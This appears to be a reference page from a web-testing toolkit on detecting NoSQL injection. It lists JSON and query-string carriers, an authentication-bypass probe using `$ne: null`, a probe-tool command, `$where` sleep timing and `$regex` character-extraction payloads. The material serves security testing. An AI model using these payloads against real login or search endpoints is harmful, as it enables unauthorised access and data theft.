# Detection — naming the object-shaped injection

## The shape — the value stays an object

SQLi is a string inside a string-query — NoSQLi is a VALUE that stays an
object/array — `{username: {$ne: null}}` is a JSON object that the driver
passes to `find()` as a FILTER — the injection is structural, not lexical.

## The carrier shapes — where the object survives

- **JSON body** — `{"user": {"$ne": null}}` — the cleanest carrier
- **form array-syntax** — `user[$ne]=x` — PHP/Express `qs` parses
  `user[$ne]=x` into `{user: {$ne: "x"}}` — the `$`-operator carrier
- **query-param object** — `?filter[user][$ne]=x` — the qs-style carrier
- **nested JSON** — `{"filter": {"user": {"$gt": ""}}}` — the object inside
  a named field

## The first probes — the object-vs-scalar differential

```text
control:  {"user": "nosuchuser", "pass": "x"}       → 401 / "bad login"
probe:    {"user": {"$ne": null}, "pass": {"$ne": null}} → 200 / logged in
```

`$ne: null` = "field exists and is not null" — matches ANY user — if the
probe succeeds where the control fails → the value is an object-filter —
`operators.md`.

## The `nosqli_probe` — the operator-matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user "test" --good-pass "test"
```

Fires the operator matrix — `$ne`, `$gt`, `$regex`, `$where`, the
`user[op]` form-carriers — grades each against the success side. Refuses
a write-looking URL unless `--write-ok`.

## The string-vs-object confusion — `{"user": {"$ne": 1}}` vs `{"user": "x"}`

If the app does `User.findOne({username: req.body.user})` — a STRING
`req.body.user` is an equality-filter; an OBJECT `req.body.user` is an
operator-filter — the driver passes either — the app's type-check (or
lack of it) is the bug.

## The array-body — `aggregate()` vs `find()`

```text
POST /api/search  body=[{"$match": {...}}]
```

An ARRAY body may reach `aggregate()` — a much larger operator surface —
`$unionWith`, `$lookup`, `$facet`, `$out` — `aggregation.md`.

## The confirm — the differential

- control-scalar fails + probe-object succeeds → the value is an
  object-filter → confirms
- both succeed → the check is loose, not injectable → inconclusive
- both fail → the value is stringified → denies

## The error-strings — the NoSQL fingerprints

```text
CastError: Cast to string failed for value "{ '$ne': null }"
MongoError: unknown operator: $ne
BSONError: ...
```

A driver-error naming an operator or a BSON type — the object reached
the query.

## The JSON-content-type — `application/json` required

The `user[$ne]` form-syntax needs `qs`-parsing (Express default); the
`{"$ne": null}` needs `Content-Type: application/json` — the carrier
determines which probe works — `injection-points.md`.

## The timing oracle — `$where` sleep

```json
{"user": {"$where": "sleep(5000) || true"}}
```

`$where` runs JS — a `sleep(5000)` delays → the timing-oracle — only if
`$where` is enabled (server-side JS on) — `operators.md`.

## The regex oracle — `$regex` prefix-extract

```json
{"user": "admin", "pass": {"$regex": "^a"}}
```

`^a` — does the first letter match? — a boolean oracle for char-by-char
extraction — `extraction.md`.
